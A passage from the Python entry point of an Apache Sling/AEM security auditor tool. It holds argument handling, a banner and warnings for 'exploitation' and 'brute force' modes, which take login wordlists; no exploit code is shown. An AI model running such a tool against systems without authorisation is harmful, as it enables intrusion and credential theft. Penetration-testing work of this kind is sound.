    parser.add_argument('--password-wordlist',
                      help='Path to password wordlist file for brute force attacks')
    
    args = parser.parse_args()

    # Validate URL
    if not urlparse(args.target).scheme:
        print(f"{Fore.RED}Error: Target URL must include scheme (http:// or https://){Style.RESET_ALL}")
        sys.exit(1)

    # Display banner
    print(r"""
    ___   ____    _   __   ____       ___   __  __  ____   ____  ______  ____    ____  
   /   | / __ \  / | / /  / __ \     /   | / / / / / __ \ /  _/ /_  __/ / __ \  / __ \ 
  / /| |/ /_/ / /  |/ /  / /_/ /    / /| |/ / / / / / / / / /    / /   / / / / / /_/ / 
 / ___ / ____/ / /|  /  / _, _/    / ___ / /_/ / / /_/ /_/ /    / /   / /_/ / / _, _/  
/_/  |_/_/     /_/ |_/  /_/ |_|   /_/  |_\____/  \____//___/   /_/    \____/ /_/ |_|   
                                                                                        
  Apache Sling/AEM Security Auditor v2.0                             
    """)

    print(f"{Fore.CYAN}[*] Target: {args.target}")
    if args.username:
        print(f"[*] Authenticating as: {args.username}")
    if args.proxy:
        print(f"[*] Using proxy: {args.proxy}")
    if args.wordlist:
        print(f"[*] Using wordlist: {args.wordlist}")
    if args.exploit:
        print(f"{Fore.RED}[!] EXPLOITATION MODE ENABLED - Vulnerabilities will be actively exploited{Style.RESET_ALL}")
    if args.brute_force:
        print(f"{Fore.RED}[!] BRUTE FORCE MODE ENABLED - Login credentials will be brute forced{Style.RESET_ALL}")
    print(f"[*] Scan mode: {args.mode}{Style.RESET_ALL}")
    
    try:
        # Create and run auditor
        auditor = SlingAuditor(
            target_url=args.target,
            username=args.username,
            password=args.password,
            timeout=args.timeout,
            verify_ssl=not args.insecure,
            verbose=args.verbose,
            threads=args.threads,
            user_agent=args.user_agent,
            cookies=args.cookies,
            proxy=args.proxy,
            output_dir=args.output,
            wordlist=args.wordlist,
            exploit=args.exploit,
            brute_force=args.brute_force,
            username_wordlist=args.username_wordlist,
            password_wordlist=args.password_wordlist
        )
        
        # Run audit using asyncio
        results = asyncio.run(auditor.run_audit(mode=args.mode))
        
        # Display summary
        print(f"\n{Fore.GREEN}=== Scan Complete ==={Style.RESET_ALL}")
        print(f"Duration: {results['scan_info']['duration']:.2f} seconds")
        print(f"Results saved to: {args.output or 'scan_results'}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
